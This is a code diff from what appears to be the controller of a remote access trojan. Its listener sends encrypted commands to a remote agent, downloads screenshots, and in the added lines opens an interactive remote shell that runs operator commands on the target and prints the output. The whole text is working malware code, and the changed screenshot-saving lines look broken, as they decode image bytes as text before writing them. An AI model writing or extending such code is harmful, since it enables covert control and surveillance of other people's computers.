@@ -72,7 +72,7 @@ def main():
             decrypted = cipher.decrypt_message(response)
             result = json.loads(decrypted)
 
-            print(result["response"].encode('utf-8'))
+            print(result["response"])
 
 
         elif command == "download":
@@ -94,12 +94,43 @@ def main():
                 'action': params
             }).encode('utf-8')
             response = listener.prompt(cipher.encrypt_message(request))
-            decrypted = cipher.decrypt_message(response)
-            now = datetime.now()
-            file = open(f'download/screenshoot_{now.strftime("%Y_%m_%d_%H%M")}.png', 'wb')
-            file.write(decrypted.encode('UTF-8'))
+            print(response)
+            decrypted = cipher.decrypt_image(response)
+            # print(decrypted)
+            # now = datetime.now()
+            file = open('download/screenshot_xxx.png', 'wb')
+            file.write(decrypted.decode("utf-8"))
             file.close()
             print("Download complete!")
+
+        elif command == "shell":
+            request = json.dumps({
+                'type': 'shell',
+                'action': ''
+            }).encode('utf-8')
+
+            response = listener.prompt(cipher.encrypt_message(request))
+            decrypted = cipher.decrypt_message(response)
+            result = json.loads(decrypted)
+
+            if result["status"] == "OK":
+                print("Shell open")
+                while True:
+                    action = input("Shell > ").strip()
+
+                    request = json.dumps({
+                        'type': 'shell',
+                        'action': action
+                    }).encode('utf-8')
+
+                    response = listener.prompt(cipher.encrypt_message(request))
+                    decrypted = cipher.decrypt_message(response)
+                    result = json.loads(decrypted)
+
+                    if result["response"] == "exit":
+                        break
+                    else:
+                        print(result["response"])
 
         else:
             data = json.dumps(
